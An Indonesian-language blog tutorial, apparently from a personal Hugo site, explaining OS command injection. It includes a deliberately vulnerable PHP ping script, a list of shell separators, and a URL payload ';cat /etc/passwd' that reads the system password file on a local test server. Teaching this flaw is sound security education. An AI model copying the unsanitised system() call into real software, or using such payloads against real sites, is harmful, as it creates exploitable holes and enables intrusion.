@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+        body {
+            background-color: black;
+            color: white;
+        }
+    </style>
+
+  <style>
+         
+        a {
+            color: #42f5d4;  
+            text-decoration: none;  
+        }
+
+         
+        a:hover {
+            color: darkgray;
+        }
+
+         
+        a:visited {
+            color: #42f5d4;  
+        }
+    </style>
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+       style>
+        body {
+            font-family: 'Inter', sans-serif;  
+        }
+
+        .fa {
+            font-family: "Font Awesome 6 Free", sans-serif;  
+            font-weight: 900;  
+        }
+    </style>
+
+   <meta name="description" content="
+
+
+
+os command injection biasanya terjadi ketika seorang web developer keliru
+dalam mengatur penerimaan input didalam situsnya. biasanya terjadi ketika
+form input yang dibuat menggunakan fungsi seperti exec(), system(), dll.
+tergantung fungsi tersebut berasal dari bahasa pemogramman apa. jika python
+biasanya menggunakan os.system() atau eval(), etc.
+tentu saja ini jadi sesuatu yang sangat berbahaya dikarenakan attacker dapat
+memasukan perintah berbahaya kedalam shell sistem operasi yang ada disitus tersebut.">  
+
+  <title>
+    
+      os command injection
+    
+  </title>
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/" />
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.08c29b7fac4a11577526584dfb08a52aee38883feba037f71d08cbe4ffde4eaffda104424494fea30b877bcb2969fe832338da1ea7b583435ce50fe3edae4777.css" integrity="sha512-CMKbf6xKEVd1JlhN&#43;wilKu44iD/roDf3HQjL5P/eTq/9oQRCRJT&#43;owuHe8spaf6DIzjaHqe1g0Nc5Q/j7a5Hdw==" />
+  
+</head>
+<body a="black">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">~ $ cd /home</a>
+
+
+<article>
+    <p class="post-meta">
+    </p>
+
+<h1>os command injection<br><br>
+    <small datetime="2022-09-01 00:00:00 &#43;0000 UTC" style="font-size: 10px; display: inline-flex; align-items: center;">
+        <img src="https://avatars.githubusercontent.com/u/51517043?v=4" alt="GitHub Profile" style="width: 30px; height: 30px; border-radius: 50%; object-fit: cover; margin-right: 8px;">
+        2022-09-01 - Rainhynn
+    </small>
+</h1>
+
+    
+
+    
+<img src="/images/cuteheker.jpeg">
+
+
+<!-- raw HTML omitted -->
+<p>os command injection biasanya terjadi ketika seorang web developer keliru
+dalam mengatur penerimaan input didalam situsnya. biasanya terjadi ketika
+form input yang dibuat menggunakan fungsi seperti <code>exec()</code>, <code>system()</code>, dll.
+tergantung fungsi tersebut berasal dari bahasa pemogramman apa. jika python
+biasanya menggunakan <code>os.system()</code> atau <code>eval()</code>, etc.</p>
+<p>tentu saja ini jadi sesuatu yang sangat berbahaya dikarenakan attacker dapat
+memasukan perintah berbahaya kedalam shell sistem operasi yang ada disitus tersebut.</p>
+<blockquote>
+<p>Serangan command injection bisa terjadi ketika sebuah aplikasi
+(forms, cookies, HTTP headers, dll) bisa menjalankan perintah yang
+tidak aman dari inputan user ke sistem shell.
+
+<a href="https://crashtest-security.com/command-injection/">crashtest security</a>
+
+</p>
+</blockquote>
+<p>menurut crashtest security, os command injection tidak hanya bisa terjadi
+di forms melainkan bisa saja ditempat lain seperti diatas.</p>
+<h1 id="demonstrasi">demonstrasi</h1>
+<p>contoh kode php yang rentan dengan os command injection karena ketiadaan
+validasi input ataupun proses filtering.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&lt;?php
+</span></span><span style="display:flex;"><span><span style="color:#eedd82">$ip</span> = <span style="color:#eedd82">$_GET</span>[<span style="color:#87ceeb">&#39;ip&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#eedd82">$cmd</span> = system(<span style="color:#87ceeb">&#39;ping &#39;</span>.<span style="color:#eedd82">$ip</span>); 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#eedd82">$cmd</span>
+</span></span><span style="display:flex;"><span>?&gt;
+</span></span></code></pre></div><ul>
+<li>buat file <code>ping.php</code> &amp; jalankan diterminal kalian</li>
+</ul>
+<p><code>$ php -S 127.0.0.1:8000 -t .</code></p>
+<p>kunjungi dan cobalah masukan input seperti ini</p>
+<p><strong>http://127.0.0.1:8000/ping.php?ip=cat%20/etc/passwd</strong></p>
+<p>maka jika dibrowser saya, ini tidak menghasilkan apa-apa. dikarenakan perintah
+<strong>cat /etc/passwd</strong> masih dianggap sebagai argumen untuk ping.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>[Thu Sep  <span style="color:#f60">1</span> 18:16:34 2022] 127.0.0.1:41126 Accepted
+</span></span><span style="display:flex;"><span>ping: unknown host cat
+</span></span><span style="display:flex;"><span>[Thu Sep  <span style="color:#f60">1</span> 18:16:34 2022] 127.0.0.1:41125 [200]: GET /ping.php?ip=cat%20/etc/passwd
+</span></span><span style="display:flex;"><span>[Thu Sep  <span style="color:#f60">1</span> 18:16:34 2022] 127.0.0.1:41125 Closing
+</span></span></code></pre></div><p>bisa dilihat disana ada pesan <strong>uknown host cat</strong>. yang menandakan perintah cat
+kita dianggap destination dari ping. nah kalian bisa mencoba nya lagi
+dengan membatalkan perintah ping dengan shell escapes.</p>
+<pre tabindex="0"><code>;
+|
+||
+&lt;
+&amp;
+&amp;&amp;
+$()
+</code></pre><p>let&rsquo;s try again</p>
+<p><strong>http://127.0.0.1:8000/ping.php?ip=;cat /etc/passwd</strong></p>
+<p>maka kalian bisa melihat bahwa disini kita berhasil untuk melakukan perintah cat
+terhadap file passwd.</p>
+
+<img src="/images/oci.jpg">
+
+
+<p>btw saya ngejalanin file php nya di termux, jadi output dari <strong>/etc/passwd</strong> nya
+agak aneh hhe.</p>
+<h1 id="other-references">other references</h1>
+<p>beberapa referensi lain yang membahas command injection lebih detail.</p>
+<ul>
+<li>command injection
+<a href="https://book.hacktricks.xyz/pentesting-web/command-injection">https://book.hacktricks.xyz/pentesting-web/command-injection</a></li>
+</ul>
+
+</article>
+<hr>
+
+<p>© 2021-2024 HnvDie</p>
+<p>Powered By Hugo ᯓᡣ𐭩</p>
+
+
+
+            </div>
+        </main>
+    </body></html>
